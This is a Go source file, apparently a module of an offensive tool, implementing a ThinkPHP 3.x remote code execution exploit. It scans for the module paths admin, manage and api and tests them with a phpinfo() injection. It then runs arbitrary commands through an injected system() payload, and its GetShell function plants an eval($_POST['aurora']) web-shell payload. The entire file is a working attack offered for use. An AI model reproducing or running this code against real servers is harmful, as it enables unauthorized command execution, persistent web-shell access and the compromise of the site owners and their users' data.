package thinkphp

import (
	"breach/internal/util"
	"io"
	"net/http"
	"strings"
)

type TP3Module struct {
	BaseUrl            string
	feature            string
	moduleList         []string
	currentModule      string
	checkVulPayloadUrl string
	execVulPayloadUrl  string
	checkStr           string
}

func NewTP3Module(baseUrl string) *TP3Module {
	return &TP3Module{
		BaseUrl:            baseUrl,
		feature:            "ThinkPHP 3.x RCE",
		moduleList:         []string{"manage", "admin", "api"},
		currentModule:      "",
		checkVulPayloadUrl: "/\\think\\module/action/param1/${@phpinfo()}",
		execVulPayloadUrl:  "/\\think\\module/action/param1/{${system($_GET['x'])}}?x=",
		checkStr:           "PHP Version",
	}
}
func (t *TP3Module) CheckVul() *util.Response {
	for _, s := range t.moduleList {
		resp, err := http.Get(t.BaseUrl + "/?=/" + s)
		if err != nil {
			return util.Fail(err.Error())
		}
		if resp.StatusCode == 200 {
			t.currentModule = s
			break
		}
	}
	if t.currentModule == "" {
		return util.Fail("no vulnerable")
	}
	payloadUrl := t.BaseUrl + "/?s=" + t.currentModule + t.checkVulPayloadUrl
	resp, err := http.Get(payloadUrl)
	if err != nil {
		return util.Fail(err.Error())
	}

	bytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return util.Fail(err.Error())
	}

	if strings.Contains(string(bytes), t.checkStr) {
		return util.Success("success", t.feature)
	}
	return util.Fail("no vulnerable")

}

func (t *TP3Module) ExecVul(cmd string) *util.Response {
	payloadUrl := t.BaseUrl + "/?s=" + t.currentModule + t.execVulPayloadUrl + cmd
	resp, err := http.Get(payloadUrl)
	if err != nil {
		return util.Fail(err.Error())
	}
	bytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return util.Fail(err.Error())
	}
	return util.Success("success", string(bytes))
}

func (t *TP3Module) GetShell() *util.Response {
	sellUrl := t.BaseUrl + "/?s=" + t.currentModule + "/\\think\\module/action/param1/{${eval($_POST['aurora'])}}"
	resp, err := http.Get(sellUrl)
	if err != nil {
		return util.Fail(err.Error())
	}
	if resp.StatusCode == 200 {
		return util.Success("success", sellUrl)
	}
	return util.Fail("no vulnerable")
}
